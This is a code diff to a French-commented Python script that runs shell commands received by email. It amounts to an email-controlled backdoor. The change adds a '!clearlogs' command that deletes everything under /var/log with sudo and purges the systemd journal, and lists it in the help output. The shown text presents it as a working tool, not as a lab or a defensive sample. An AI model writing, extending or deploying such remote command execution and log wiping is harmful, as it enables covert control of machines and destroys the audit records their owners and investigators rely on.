@@ -41,16 +41,29 @@ def execute_command(command):
         # Si une exception se produit lors de l'exécution de la commande, retourner un message d'erreur
         return f"Error executing command: {e}"
 
+def clear_logs():
+    """Effacer les logs système sous Linux"""
+    try:
+        # Effacer les logs courants
+        subprocess.call("sudo rm -rf /var/log/*", shell=True)
+        subprocess.call("sudo journalctl --rotate", shell=True)
+        subprocess.call("sudo journalctl --vacuum-time=1s", shell=True)
+        return "Logs cleared successfully."
+    except Exception as e:
+        return f"Error clearing logs: {e}"
+
 def process_email_message(email_message):
     """Traitement de l'e-mail"""
     subject = email_message['Subject']
     if subject.startswith("!command"):
-        command = email_message.get_payload()
-        return execute_command(command)
+        command = email_message.get_payload().strip()
+        return execute_command(command.split())
     elif subject == "!status":
         return "System status: OK"
     elif subject == "!help":
-        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message."
+        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message.\n!clearlogs: Clear system logs."
+    elif subject == "!clearlogs":
+        return clear_logs()
     else:
         return "Unknown command"
 
